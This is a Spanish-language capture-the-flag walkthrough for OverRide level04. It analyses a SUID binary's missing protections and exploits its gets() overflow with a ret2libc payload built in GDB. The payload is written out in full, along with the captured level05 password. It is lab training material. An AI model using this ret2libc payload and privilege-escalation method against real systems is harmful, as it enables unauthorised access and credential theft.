# 1. Buscar Binario:

Listamos los archivos para que muetre el biarnio del `level04` y sus permisos:

```bash
level04@OverRide:~$ ls -la 
total 17
dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile
level04@OverRide:~$ 
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level05`).

# 2. Analizamos las protecciones de la RAM
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

### a). PIE:
```bash
level04@OverRide:~$ file ./level04 
./level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
```

## b). ASLR:
```bash
level04@OverRide:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level04@OverRide:~$ readelf -l ./level04 | grep -E "RELRO|STACK"
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
GNU_RELRO      0x000f00 0x08049f00 0x08049f00 0x00100 0x00100 R   0x1
```

### d). STACK CANARY:
```bash
level04@OverRide:~$ nm ./level04 
08049f18 d _DYNAMIC
08049ff4 d _GLOBAL_OFFSET_TABLE_
080488fc R _IO_stdin_used
         w _Jv_RegisterClasses
08049f08 d __CTOR_END__
08049f04 d __CTOR_LIST__
08049f10 D __DTOR_END__
08049f0c d __DTOR_LIST__
08048ae4 r __FRAME_END__
08049f14 d __JCR_END__
08049f14 d __JCR_LIST__
0804a040 A __bss_start
0804a038 D __data_start
080488b0 t __do_global_ctors_aux
080485b0 t __do_global_dtors_aux
0804a03c D __dso_handle
         w __gmon_start__
080488a2 T __i686.get_pc_thunk.bx
08049f04 t __init_array_end
08049f00 t __init_array_start
         U __isoc99_scanf@@GLIBC_2.7
080488a0 T __libc_csu_fini
08048830 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804a040 A _edata
0804a04c A _end
080488dc T _fini
080488f8 R _fp_hw
0804845c T _init
08048580 T _start
         U alarm@@GLIBC_2.0
08048634 T clear_stdin
0804a044 b completed.6159
0804a038 W data_start
0804a048 b dtor_idx.6161
080486a0 T enable_timeout_cons
         U fflush@@GLIBC_2.0
         U fork@@GLIBC_2.0
08048610 t frame_dummy
08048657 T get_unum
         U getchar@@GLIBC_2.0
         U gets@@GLIBC_2.0
         U kill@@GLIBC_2.0
080486c8 T main
         U prctl@@GLIBC_2.0
0804868f T prog_timeout
         U ptrace@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U signal@@GLIBC_2.0
0804a040 B stdout@@GLIBC_2.0
         U wait@@GLIBC_2.0
```

### e). `.got` y `.plt`:
```bash
level04@OverRide:~$ readelf -S ./level04 | grep -E ".got|.plt"
[10] .rel.plt          REL             080483ec 0003ec 000070 08   A  5  12  4
[12] .plt              PROGBITS        08048490 000490 0000f0 04  AX  0   0 16
[23] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
[24] .got.plt          PROGBITS        08049ff4 000ff4 000044 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

**IMPORTANTE**:
Estamos ante un Binario de `32 bits` tal y como nos muestra `file ./level04`

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000`. |
| **ASLR** | **OFF** | `0` | El Heap y el Stack no se mueven; las direcciones son fijas. |
| **NX** | **OFF** | `RWE` | El Stack **SÍ** permite ejecución. Podemos meter y correr Shellcode allí. |
| **RELRO** | **PARTIAL** | `R` | La sección `.got.plt` sigue siendo escribible `(WA)`. Podríamos hacer un `GOT Hijack` si fuera necesario. |
| **CANARY** | **NO** | `ausencia` | No hay "centinela" al final del stack. Podemos desbordar el buffer y el programa NO lo detectará. |
| **.got.plt** | **WA** | `WA` | Confirma sección `.got.plt` en escritura. |

---

# 4. Fuzzing:

Al ejecutar el binario, el programa nos da la bienvenida con el mensaje `Give me some shellcode, k ` en lo que parece ser una `shell_code` abierta y en la espera que introducamos una linea de comandos.

```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k

level03@OverRide:~$ 
```
Probamos varios comando y siempre nos devuelve el mismo mensaje: `child is exiting...`

```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
ps aux      
child is exiting...
level04@OverRide:~$ 
level04@OverRide:~$ ./level04 
Give me some shellcode, k
ls la
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
k ls -la
child is exiting...
```

Intentamos provocar un `segtfault` al llenar el buffer de bytes, y lo que logramos es que siga aceptando mensajes.
```bash
evel04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

k
whoami
cat /home/usres/level05/.pass



aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

^C
level04@OverRide:~$ 
```
---

# 5. Reverse Engineering (Target Identification):

El comando `nm` nos muestra funciones importantes:

```bash
U gets@@GLIBC_2.0         ⟸
U fork@@GLIBC_2.0         ⟸
U ptrace@@GLIBC_2.0       ⟸
U alarm@@GLIBC_2.0        ⟸
U kill@@GLIBC_2.0         ⟸
U wait@@GLIBC_2.0         ⟸
```

* `gets()`: Función **insegura** que no controla el tamaño del buffer — vector
  directo de **Stack Buffer Overflow**.
* `fork()` y `wait()`: El programa crea un proceso hijo — la lógica principal
  probablemente corre en el hijo mientras el padre espera.
* `ptrace()`: El proceso padre usa `ptrace` para **monitorizar** al hijo —
  técnica antidebugging que detecta si el binario está siendo analizado con GDB.
* `alarm()` y `kill()`: El programa implementa un **timeout** — si no se
  introduce el input en tiempo, el proceso hijo es eliminado.

Para ver con detalle el análisis consulta el archivo [asm_analysis.md](https://github.com/4trastos/OverRide/blob/main/level04/Resources/README.md) en conjunto con el programa de demostración [source.c](https://github.com/4trastos/OverRide/blob/main/level04/source.c).

---

# 6. Solución:

Para resolver este nivel necesitamos explotar la vulnerabilidad **Stack Buffer Overflow**
en `gets()` usando la técnica **Ret2Libc** — igual que en el level01. El padre bloquea
`execve()` con `ptrace` pero no bloquea `system()`.

---

## 1. Preparar el entorno en GDB:

Como el binario usa `fork()`, necesitamos decirle a GDB que siga al proceso hijo
donde corre `gets()`. También necesitamos saltar el `ptrace(PTRACE_TRACEME)` que
actúa como antidebugging:

```bash
(gdb) set follow-fork-mode child
(gdb) b *0x08048746
(gdb) b *0x0804875e
(gdb) r
# cuando pare en ptrace:
(gdb) set $eax = 0
(gdb) c
# cuando pare en gets:
(gdb) i f
(gdb) p $esp+0x20
```

---

## 2. Calcular el offset:

```
saved eip:  0xffffd70c
buffer:     0xffffd670
offset = 0xffffd70c - 0xffffd670 = 0x9c = 156 bytes
```

---

## 3. Encontrar las direcciones:

Ponemos un breakpoint en `main` y arrancamos el programa para que la `libc`
se mapee en memoria:

```bash
(gdb) b main
(gdb) r
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Buscamos la cadena `/bin/sh` en el rango de la libc:

```bash
(gdb) info proc mapping
0xf7e2c000 0xf7fcc000   /lib32/libc-2.15.so    ⟸
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

* `system()`: `0xf7e6aed0`
* `"/bin/sh"`: `0xf7f897ec`

---

## 4. Construcción del payload:

1. `156 bytes` de relleno para desbordar el buffer hasta el `EIP`.
2. La dirección de `system()`.
3. `4 bytes` de `Dummy Return`.
4. La dirección de `"/bin/sh"`.

```bash
(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; echo "whoami"; echo "cat /home/users/level05/.pass"; cat) | ./level04
```

---

## 5. Ejecución:

```bash
level04@OverRide:~$ (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; echo "whoami"; echo "cat /home/users/level05/.pass"; cat) | ./level04
Give me some shellcode, k
level05
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---

# 7. Conclusión:

El nivel 04 combina dos técnicas defensivas nuevas: `fork()` para aislar la ejecución
del input en un proceso hijo, y `ptrace(PTRACE_PEEKUSER)` en el padre para detectar
y bloquear cualquier llamada a `execve()` (syscall `0xb`). Esto hace inútil cualquier
shellcode que intente lanzar una shell directamente.

Sin embargo, el uso de `gets()` sin límite de tamaño sigue siendo una vulnerabilidad
de **Stack Buffer Overflow**. Como `system()` no usa `execve()` directamente sino que
llama a `/bin/sh` a través de la libc, el padre no la detecta.

La técnica **Ret2Libc** del level01 funciona aquí exactamente igual — el antidebugging
de `ptrace` solo bloquea `execve()`, no los saltos a funciones de la libc.

---

